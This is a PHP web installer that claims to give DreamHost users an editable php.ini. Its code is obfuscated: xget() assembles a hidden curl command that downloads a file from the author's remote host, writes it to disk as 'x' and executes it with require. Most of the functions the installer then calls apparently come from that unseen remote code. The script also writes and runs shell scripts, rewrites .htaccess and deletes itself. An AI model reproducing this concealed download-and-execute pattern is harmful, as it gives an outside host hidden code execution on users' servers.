<?php

/*
	DreamHost PHP.INI installer
	Copyright (c) 2008 Shayne Burley
	All Rights Reserved.
	email: sxi@sabrextreme.com
	web: http://sxi.sabrextreme.com
	forum: http://sxi.sabrextreme.com/forum
*/

$src='http://sxi.sabrextreme.com';
$pkg='DreamHost Custom PHP.INI installer';
$dsc='It gives you access to an editable php.ini';
function page($ptitle) { global $title;
echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>";?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" dir="ltr">
<head>
<meta http-equiv="Content-Type" content="text/html" />
<meta http-equiv="Content-Style-Type" content="text/css" />
<link rel="stylesheet" media="all" href="http://a.sxi.sabrextreme.com/css/pub_ai.css" type="text/css" />
<link rel="icon" type="image/png" href="http://a.sxi.sabrextreme.com/images/favicon.png" />
<?php if(!$title) nobase(); ?>
<title><?php echo $title ;?></title>
</head>
<body id="install">
<div id="titleHeader" class="title"><?php echo $ptitle ?></div>
<div id="contentContainer" class ="mainContent">
<?php }

$rfer=$_SERVER['SCRIPT_URI'];$spth=$_SERVER['SCRIPT_FILENAME'];

$x1=shell_ex;$x2='require';
set_error_handler('xerr');
$s=$src;$e='extern';$x=`echo`;$c='curl -so ';$x='x';//echo $x;
session_cache_limiter('private');
session_start();
$x=isset($_POST['install'])?xset():xget();
require(x);$ul(x);
$x=isset($_POST['stage'])?$_POST['stage']:'';
switch ($x)
{
case '':
if (!$is($lck)) {
page("Let's install some stuff!");
_col1();
?>
<div id="contents" class="tasks">Package Contents</div>
<span class="description"><?php echo $pkg ?></span>
<div id="whatisit" class="tasks">What does this auto-installer do?</div>
<span class="description">
	<?php echo $dsc ?>
</span>
<form method="post" action="" class="form">
<fieldset>
<legend class="ablue"><?php ;echo $dhst ;?></legend>
<div class="infldset">
<table class="aligntop" cellspacing="6" summary="auto-detected values">
<tr><th scope="row">path:</th><td><input type='text' name='dpth' value='<?php ;echo $dpth ;?>' size='45' disabled='disabled' /></td></tr>
<tr><td><input type='hidden' name='stage' value='install' /></td></tr>
</table>
</div>
</fieldset>
<p><input type="submit" name="install" value="Install" /></p>
</form>
<?php
footer();
} else _lerr()
?>
<?php
break;
case 'install':
$ntfy = $_POST['ntfy'];
if (!$is($lck)) {
$x=`$tch$lck`;
$ul($spth);
if($isd($cd)) $n1=x;else $mkd($cd);$cm($cd,0711);
if($isd($tt)) $n8=x;else $mkd($tt);$cm($tt,0711);
if($is($p1)) {
$n2=x;
if ($sz($p1) < 500) $ul($p1);
}
if($is($p3)) {
$n5=x;
if ($sz($p3) > 500) {
$cp($p3,$p1);if($is($p1)) $ul($p3);
}
}
if($is($p4)) {
$n6=x;$tv="$p4$ol";$cp($p4,$tv);$ul($p4);
}
$dc="/dh/cgi-system/php5.cgi";
$fh=$fo($p4,'w');$fw($fh,"#!/bin/sh\n$ex PHPRC=$rc/\n$xx $dc");$fc($fh);$cm($p4,0700);
if($is($p5)) {
$n7=x;$tv="$p5$ol";$cp($p5,$tv);$ul($p5);
}
$fh=$fo($p5,'w');$fw($fh,"#!/bin/sh\n$ex PHPRC=$rc/\n$ex PHP_FCGI_CHILDREN=2\n$xx $dc $*");$fc($fh);$cm($p5,0700);
if($is($fp1)) {
$n9=x;
} else {
$fh=$fo($fp1,'w');$fw($fh,"<?php ;phpinfo() ;?>");$fc($fh);$cm($fp1,0700);
}
if($is($p2)) $n3=x;
$fh=$fo($sh,'w');$fw($fh,"#!/bin/sh\ncd $dpth\n$ex PATH=/usr/local/php5/bin:\$PATH\nDC=`php -r \"phpinfo();\"|grep Loaded|awk '{print \$5}'`\nif [ -e \$DC ]; then\ncp -f \$DC ".$cd."/php.ini\nelse\ncp -f /etc/php5/cgi/php.ini ".$cd."/php.ini\nfi\nperl -p -i -e 's/.*post_max_size.*/post_max_size = ".$mx."M/;s/.*upload_max_filesize.*/upload_max_filesize = ".$mx."M/;' \"$cd/php.ini\"\n$tch$ht\nperl -pi -e 's/.*Action php.*//;s/.*AddHandler f.*//;s/.*AddHandler php.*//;s/.*DH-PH.*//;s/^\n//;' $ht\ncd $cd\n");$fc($fh);
$cm($sh,0600);$xx('sh sh');$ul($sh);
$n4=x;$gd=implode("",file($ht));$fh=$fo($ht,'w');$fw($fh,$h2.$gd);$fc($fh);
$cm($p2,0600);
$fh=$fo($fpd,'w');$fw($fh,"path: ".$dpth."\ndefault: ".$dc."\nserver: ".$st."\nn1= ".$n1."\nn2= ".$n2."\nn3= ".$n3."\nn4= ".$n4."\nn5= ".$n5."\nn6= ".$n6."\nn7= ".$n7."\nn8= ".$n8."\nn9= ".$n9."\n");$fc($fh);
$ul($lck);
page("Installation Complete!");
_col1();
_complete();
if(($n2)||($n3)||($n4)) _notes();
_secure();
_whatnow();
_col2();
_donate();
_addend();
footer();
exit;
} else _lerr();
}
function nobase() { ?>

<style type="text/css">
body {
background-image: url('http://a.sxi.sabrextreme.com/images/bgerr.png');
background-repeat: no-repeat;
}
.column1 { color: #000; }
.title { color: #FFCCCC; }
.tasks { color: #F00; }
a { color: #009900 }
a:hover { color: #0000FF;text-decoration: none; }
</style>
<?php }
function xerr($errn, $errs) {
global $x1,$x2,$x3;
if ($errn=='8') return;
if(($errn=='1')||($errn=='2')) {
$x=(strstr($errs,$x1))||(strstr($errs,$x2))?$x='x':$x='';
if($x) {
page('Uh oh!'); ?>
<div class="column1">
<div class="tasksection">
<div id="problem" class="tasks">I've encountered an error...</div>
<?php if (strstr($errs,$x1)) {
echo"
<p>Unfortunately your current environment doesn't support this script.</p>";
} else {
echo"
<p>The good news is that my tests indicate the problem is probably just 
a temporary communication hold-up, so just try running me again in a few 
minutes!</p>";
}
echo"	<p>If necessary you can seek help at one of the Support links below.</p>";
footer();
}
exit;
}
echo "<b>Error:</b> [$errn] $errs<br />";
echo "Refer to vendor.";
exit;
}
function xset() { global $x;
if(isset($_SESSION['x'])) {
$x=$_SESSION['x'];
$z=fopen(x,w);fwrite($z,$x);fclose($z);
} else {
xerr(1,$x2);
exit;
}
}
function xget() { global $s,$e,$x,$c;
$x="$s/$e/$x";$x=`$c x -e $s -A $e $x`;
$x=implode('',file(x));
$_SESSION['x']=$x;
}
function footer() {
if (function_exists('_footer')) { _footer();return; }
global $src,$rfer ;?>
</div></div></div>
<div class="footer"><hr/>
<div id="help">
<a id="browseTools" href="<?php ;echo $src ;?>">Browse Tools and Auto-Installers</a>&nbsp; 
| &nbsp;<a id="supportDesk" href="<?php ;echo $src.'/support/' ;?>">Client Support Desk</a>&nbsp; 
| &nbsp;<a id="supportForum" href="<?php ;echo $src.'/forum/' ;?>">Public Support Forum</a> 
<span class="copyright">
<a id="xhtml" class="dim" href="http://validator.w3.org/check?uri=referer">xhtml 1.1</a>&nbsp;&nbsp;
<a id="css" class="dim" href="http://jigsaw.w3.org/css-validator/validator?uri=<?php ;echo $rfer ;?>&amp;profile=css3">css 3</a>&nbsp; 
</span>
</div></div>
</body>
</html><?php
}
?>